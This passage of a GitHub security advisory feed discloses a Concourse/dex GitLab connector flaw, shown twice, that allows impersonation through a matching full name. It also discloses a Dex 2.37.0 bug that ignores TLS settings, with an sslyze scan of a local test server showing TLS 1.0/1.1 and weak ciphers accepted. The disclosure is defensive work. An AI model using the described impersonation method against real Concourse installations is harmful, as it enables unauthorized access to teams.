        <id>https://github.com/advisories/GHSA-627p-rr78-99rj</id>
        <link href="https://github.com/advisories/GHSA-627p-rr78-99rj"/>
        <updated>2025-05-27T15:54:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Installations which use the GitLab auth connector are vulnerable to identity spoofing by way of configuring a GitLab account with the same full name as another GitLab user who is granted access to a Concourse team by having their full name listed under <code>users</code> in the team configuration or given to the <code>--gitlab-user</code> flag.</p>
<p>See the <a href="https://concourse-ci.org/gitlab-auth.html">GitLab auth docs</a> for details.</p>
<p>Concourse installations which do not configure the GitLab auth connector are not affected.</p>
<h3 id="patches">Patches</h3>
<p>Concourse <a href="https://github.com/concourse/concourse/releases/tag/v6.3.1">v6.3.1</a> and <a href="https://github.com/concourse/concourse/releases/tag/v6.4.1">v6.4.1</a> were both released with a fix on August 4th, 2020.</p>
<p>Both versions change the GitLab connector to use the username, rather than the full name. This was always the intent, and the previous behavior was originally reported as a bug (concourse/dex#7) prior to being reported as a security issue.</p>
<p>Any Concourse teams which configure GitLab users will have to switch each user from their full name to their username upon upgrading to these versions.</p>
<h3 id="workarounds">Workarounds</h3>
<p>GitLab groups do not have this vulnerability, so GitLab users may be moved into groups which are then configured in the Concourse team.</p>
<h3 id="references">References</h3>
<ul>
<li>concourse/dex#12: PR with the fix</li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, you may reach us privately at <a href="mailto:concourseteam+security@gmail.com">concourseteam+security@gmail.com</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/concourse/concourse/security/advisories/GHSA-627p-rr78-99rj">https://github.com/concourse/concourse/security/advisories/GHSA-627p-rr78-99rj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-5415">https://nvd.nist.gov/vuln/detail/CVE-2020-5415</a></li>
<li><a href="https://tanzu.vmware.com/security/cve-2020-5415">https://tanzu.vmware.com/security/cve-2020-5415</a></li>
<li><a href="https://github.com/advisories/GHSA-627p-rr78-99rj">https://github.com/advisories/GHSA-627p-rr78-99rj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-627p-rr78-99rj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-12-20T17:56:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/concourse/dex] GitLab auth uses full name instead of username as user ID, allowing impersonation]]></title>
        <id>https://github.com/advisories/GHSA-627p-rr78-99rj</id>
        <link href="https://github.com/advisories/GHSA-627p-rr78-99rj"/>
        <updated>2025-05-27T15:54:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Installations which use the GitLab auth connector are vulnerable to identity spoofing by way of configuring a GitLab account with the same full name as another GitLab user who is granted access to a Concourse team by having their full name listed under <code>users</code> in the team configuration or given to the <code>--gitlab-user</code> flag.</p>
<p>See the <a href="https://concourse-ci.org/gitlab-auth.html">GitLab auth docs</a> for details.</p>
<p>Concourse installations which do not configure the GitLab auth connector are not affected.</p>
<h3 id="patches">Patches</h3>
<p>Concourse <a href="https://github.com/concourse/concourse/releases/tag/v6.3.1">v6.3.1</a> and <a href="https://github.com/concourse/concourse/releases/tag/v6.4.1">v6.4.1</a> were both released with a fix on August 4th, 2020.</p>
<p>Both versions change the GitLab connector to use the username, rather than the full name. This was always the intent, and the previous behavior was originally reported as a bug (concourse/dex#7) prior to being reported as a security issue.</p>
<p>Any Concourse teams which configure GitLab users will have to switch each user from their full name to their username upon upgrading to these versions.</p>
<h3 id="workarounds">Workarounds</h3>
<p>GitLab groups do not have this vulnerability, so GitLab users may be moved into groups which are then configured in the Concourse team.</p>
<h3 id="references">References</h3>
<ul>
<li>concourse/dex#12: PR with the fix</li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, you may reach us privately at <a href="mailto:concourseteam+security@gmail.com">concourseteam+security@gmail.com</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/concourse/concourse/security/advisories/GHSA-627p-rr78-99rj">https://github.com/concourse/concourse/security/advisories/GHSA-627p-rr78-99rj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-5415">https://nvd.nist.gov/vuln/detail/CVE-2020-5415</a></li>
<li><a href="https://tanzu.vmware.com/security/cve-2020-5415">https://tanzu.vmware.com/security/cve-2020-5415</a></li>
<li><a href="https://github.com/advisories/GHSA-627p-rr78-99rj">https://github.com/advisories/GHSA-627p-rr78-99rj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-627p-rr78-99rj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-12-20T17:56:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/dexidp/dex] Dex discarding TLSconfig and always serves deprecated TLS 1.0/1.1 and insecure ciphers]]></title>
        <id>https://github.com/advisories/GHSA-gr79-9v6v-gc9r</id>
        <link href="https://github.com/advisories/GHSA-gr79-9v6v-gc9r"/>
        <updated>2025-05-27T15:45:14.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Dex 2.37.0 is serving HTTPS with insecure TLS 1.0 and TLS 1.1.</p>
<h3 id="details">Details</h3>
<p>While working on <a href="https://github.com/dexidp/dex/issues/2848">https://github.com/dexidp/dex/issues/2848</a> and implementing configurable TLS support, I noticed my changes did not have any effect in TLS config, so I started investigating. </p>
<p><a href="https://github.com/dexidp/dex/blob/70d7a2c7c1bb2646b1a540e49616cbc39622fb83/cmd/dex/serve.go#L425">https://github.com/dexidp/dex/blob/70d7a2c7c1bb2646b1a540e49616cbc39622fb83/cmd/dex/serve.go#L425</a> is seemingly setting TLS 1.2 as minimum version, but the whole tlsConfig is ignored after "TLS cert reloader" was introduced in <a href="https://github.com/dexidp/dex/pull/2964">https://github.com/dexidp/dex/pull/2964</a>. Configured cipher suites are not respected either, as seen on the output.</p>
<h3 id="poc">PoC</h3>
<p>Build Dex, generate certs with <code>gencert.sh</code>, modify <code>config.dev.yaml</code> to run on https, using generated certs.</p>
<pre><code class="language-console">issuer: http://127.0.0.1:5556/dex

storage:
  type: sqlite3
  config:
    file: dex.db

web:
  https: 127.0.0.1:5556
  tlsCert: examples/k8s/ssl/cert.pem
  tlsKey: examples/k8s/ssl/key.pem

&lt;rest as default&gt;
</code></pre>
<p>Run dex <code>bin/dex serve config.dev.yaml</code>.</p>
<p>Install <code>sslyze</code>, easy to use SSL connection analyzer:</p>
<pre><code class="language-console">pip3 install sslyze
sslyze 127.0.0.1:5556
</code></pre>
<p>In Dex 2.37.0, TLS 1.0 and TLS 1.1 are enabled in addition to expected TLS 1.2 and TLS 1.3.</p>
<pre><code class="language-console"> * TLS 1.0 Cipher Suites:
     Attempted to connect using 80 cipher suites.

     The server accepted the following 6 cipher suites:
        TLS_RSA_WITH_AES_256_CBC_SHA                      256                      
        TLS_RSA_WITH_AES_128_CBC_SHA                      128                      
        TLS_RSA_WITH_3DES_EDE_CBC_SHA                     168                      
        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                256       ECDH: prime256v1 (256 bits)
        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                128       ECDH: prime256v1 (256 bits)
        TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA               168       ECDH: prime256v1 (256 bits)

     The group of cipher suites supported by the server has the following properties:
       Forward Secrecy                    OK - Supported
       Legacy RC4 Algorithm               OK - Not Supported


 * TLS 1.1 Cipher Suites:
     Attempted to connect using 80 cipher suites.

     The server accepted the following 6 cipher suites:
        TLS_RSA_WITH_AES_256_CBC_SHA                      256                      
        TLS_RSA_WITH_AES_128_CBC_SHA                      128                      
        TLS_RSA_WITH_3DES_EDE_CBC_SHA                     168                      
        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                256       ECDH: prime256v1 (256 bits)
        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                128       ECDH: prime256v1 (256 bits)
        TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA               168       ECDH: prime256v1 (256 bits)

     The group of cipher suites supported by the server has the following properties:
       Forward Secrecy                    OK - Supported
       Legacy RC4 Algorithm               OK - Not Supported


 * TLS 1.2 Cipher Suites:
     Attempted to connect using 156 cipher suites.

     The server accepted the following 11 cipher suites:
        TLS_RSA_WITH_AES_256_GCM_SHA384                   256                      
        TLS_RSA_WITH_AES_256_CBC_SHA                      256                      
        TLS_RSA_WITH_AES_128_GCM_SHA256                   128                      
        TLS_RSA_WITH_AES_128_CBC_SHA                      128                      
        TLS_RSA_WITH_3DES_EDE_CBC_SHA                     168                      
        TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256       256       ECDH: X25519 (253 bits)
        TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384             256       ECDH: prime256v1 (256 bits)
        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                256       ECDH: prime256v1 (256 bits)
        TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256             128       ECDH: prime256v1 (256 bits)
        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                128       ECDH: prime256v1 (256 bits)
        TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA               168       ECDH: prime256v1 (256 bits)

     The group of cipher suites supported by the server has the following properties:
       Forward Secrecy                    OK - Supported
       Legacy RC4 Algorithm               OK - Not Supported


 * TLS 1.3 Cipher Suites:
     Attempted to connect using 5 cipher suites.

     The server accepted the following 3 cipher suites:
        TLS_CHACHA20_POLY1305_SHA256                      256       ECDH: X25519 (253 bits)
        TLS_AES_256_GCM_SHA384                            256       ECDH: X25519 (253 bits)
        TLS_AES_128_GCM_SHA256                            128       ECDH: X25519 (253 bits)
</code></pre>
<p>In Dex 2.36.0, TLS 1.0 and TLS 1.1 are disabled as expected.</p>
<pre><code class="language-console"> * TLS 1.0 Cipher Suites:
     Attempted to connect using 80 cipher suites; the server rejected all cipher suites.

 * TLS 1.1 Cipher Suites:
     Attempted to connect using 80 cipher suites; the server rejected all cipher suites.

 * TLS 1.2 Cipher Suites:
     Attempted to connect using 156 cipher suites.

     The server accepted the following 5 cipher suites:
        TLS_RSA_WITH_AES_256_GCM_SHA384                   256                      
        TLS_RSA_WITH_AES_128_GCM_SHA256                   128                      
        TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256       256       ECDH: X25519 (253 bits)
        TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384             256       ECDH: prime256v1 (256 bits)
        TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256             128       ECDH: prime256v1 (256 bits)

     The group of cipher suites supported by the server has the following properties:
       Forward Secrecy                    OK - Supported
       Legacy RC4 Algorithm               OK - Not Supported


 * TLS 1.3 Cipher Suites:
     Attempted to connect using 5 cipher suites.

     The server accepted the following 3 cipher suites:
        TLS_CHACHA20_POLY1305_SHA256                      256       ECDH: X25519 (253 bits)
        TLS_AES_256_GCM_SHA384                            256       ECDH: X25519 (253 bits)
</code></pre>
<h3 id="impact">Impact</h3>
<p>TLS 1.0 and TLS 1.1 connections can be decrypted by the attacker, and hence decrypt the traffic to Dex.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dexidp/dex/security/advisories/GHSA-gr79-9v6v-gc9r">https://github.com/dexidp/dex/security/advisories/GHSA-gr79-9v6v-gc9r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23656">https://nvd.nist.gov/vuln/detail/CVE-2024-23656</a></li>
<li><a href="https://github.com/dexidp/dex/issues/2848">https://github.com/dexidp/dex/issues/2848</a></li>
<li><a href="https://github.com/dexidp/dex/pull/2964">https://github.com/dexidp/dex/pull/2964</a></li>
<li><a href="https://github.com/dexidp/dex/commit/5bbdb4420254ba73b9c4df4775fe7bdacf233b17">https://github.com/dexidp/dex/commit/5bbdb4420254ba73b9c4df4775fe7bdacf233b17</a></li>
<li><a href="https://github.com/dexidp/dex/blob/70d7a2c7c1bb2646b1a540e49616cbc39622fb83/cmd/dex/serve.go#L425">https://github.com/dexidp/dex/blob/70d7a2c7c1bb2646b1a540e49616cbc39622fb83/cmd/dex/serve.go#L425</a></li>
<li><a href="https://github.com/advisories/GHSA-gr79-9v6v-gc9r">https://github.com/advisories/GHSA-gr79-9v6v-gc9r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gr79-9v6v-gc9r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-26T01:57:31.000Z</published>
    </entry>
</feed>